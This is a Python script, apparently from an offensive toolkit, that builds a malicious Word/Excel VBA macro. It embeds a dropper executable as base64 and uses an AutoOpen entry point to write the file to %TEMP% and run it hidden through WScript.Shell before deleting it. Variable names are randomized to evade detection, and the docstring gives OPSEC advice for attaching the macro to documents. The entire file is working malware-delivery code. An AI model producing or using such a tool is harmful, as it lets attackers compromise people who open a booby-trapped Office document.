#!/usr/bin/env python3
"""
hostpayload_v2 VBA macro delivery wrapper.

Embeds a small staged dropper.exe as base64 in a Word/Excel macro. At runtime
the macro writes the dropper to %TEMP%, executes it via WScript.Shell, and
then deletes the saved file after a short delay.

For best OPSEC, use the staged dropper (a few KB) rather than the embedded
variant (100+ KB). The generated macro should be attached to a document via
your own tooling (e.g. macro_pack, oletools, or manual insertion).

Usage:
    python3 delivery/vba.py --dropper build/dropper_staged.exe --output run.vba
"""

import argparse
import base64
import os
import random
import string
import sys
from pathlib import Path


VBA_TEMPLATE = """Private Sub __AUTO_OPEN__()
    Dim __XML__ As Object
    Dim __NODE__ As Object
    Dim __STREAM__ As Object
    Dim __SHELL__ As Object
    Dim __FSO__ As Object
    Dim __DATA__ As String
    Dim __PATH__ As String
    Dim __DROP__ As String
    Dim __DELAY__ As Date

    __DATA__ = "__PAYLOAD__"
    __PATH__ = Environ("TEMP") & "\\__FILENAME__"

    Set __XML__ = CreateObject("Microsoft.XMLDOM")
    Set __NODE__ = __XML__.createElement("base64")
    __NODE__.DataType = "bin.base64"
    __NODE__.Text = __DATA__

    Set __STREAM__ = CreateObject("ADODB.Stream")
    __STREAM__.Type = 1
    __STREAM__.Mode = 3
    __STREAM__.Open
    __STREAM__.Write __NODE__.NodeTypedValue
    __STREAM__.SaveToFile __PATH__, 2
    __STREAM__.Close

    Set __SHELL__ = CreateObject("WScript.Shell")
    __SHELL__.Run Chr(34) & __PATH__ & Chr(34), 0, False

    __DELAY__ = Now() + TimeValue("00:00:05")
    Do Until Now() >= __DELAY__
        DoEvents
    Loop

    On Error Resume Next
    Set __FSO__ = CreateObject("Scripting.FileSystemObject")
    __FSO__.DeleteFile __PATH__, True
    On Error GoTo 0
End Sub
"""


def random_name(length: int = 8) -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=length)) + ".exe"


def build_vba(dropper_bytes: bytes, filename: str | None = None, auto_open: str = "AutoOpen") -> str:
    filename = filename or random_name()
    b64 = base64.b64encode(dropper_bytes).decode()
    # VBA string literal max line length ~1024; chunk to stay safe
    if not b64:
        chunked = '""'
    else:
        lines = ['"' + b64[i : i + 512] + '"' for i in range(0, len(b64), 512)]
        chunked = " _\n        & ".join(lines)
    return (
        VBA_TEMPLATE.replace("__AUTO_OPEN__", auto_open)
        .replace("__PAYLOAD__", chunked)
        .replace("__FILENAME__", filename)
        .replace("__XML__", "x" + random_name(6).replace(".", "_"))
        .replace("__NODE__", "n" + random_name(6).replace(".", "_"))
        .replace("__STREAM__", "s" + random_name(6).replace(".", "_"))
        .replace("__SHELL__", "sh" + random_name(6).replace(".", "_"))
        .replace("__FSO__", "f" + random_name(6).replace(".", "_"))
        .replace("__DATA__", "d" + random_name(6).replace(".", "_"))
        .replace("__PATH__", "p" + random_name(6).replace(".", "_"))
        .replace("__DROP__", "dr" + random_name(6).replace(".", "_"))
        .replace("__DELAY__", "t" + random_name(6).replace(".", "_"))
    )


def main() -> int:
    parser = argparse.ArgumentParser(description="Embed a dropper.exe in a VBA macro wrapper")
    parser.add_argument("--dropper", required=True, type=Path, help="dropper.exe to embed")
    parser.add_argument("--output", required=True, type=Path, help="output .vba file")
    parser.add_argument("--filename", help="filename used when written to %%TEMP%%")
    parser.add_argument("--auto-open", default="AutoOpen", help="macro entry point name")
    args = parser.parse_args()

    if not args.dropper.exists():
        print(f"[!] dropper not found: {args.dropper}", file=sys.stderr)
        return 1

    payload = args.dropper.read_bytes()
    if not payload:
        print("[!] dropper is empty", file=sys.stderr)
        return 1

    vba = build_vba(payload, args.filename, args.auto_open)
    args.output.write_text(vba, encoding="utf-8")
    print(f"[+] wrote {args.output} ({len(vba)} chars, dropper {len(payload)} bytes)")
    return 0


if __name__ == "__main__":
    sys.exit(main())
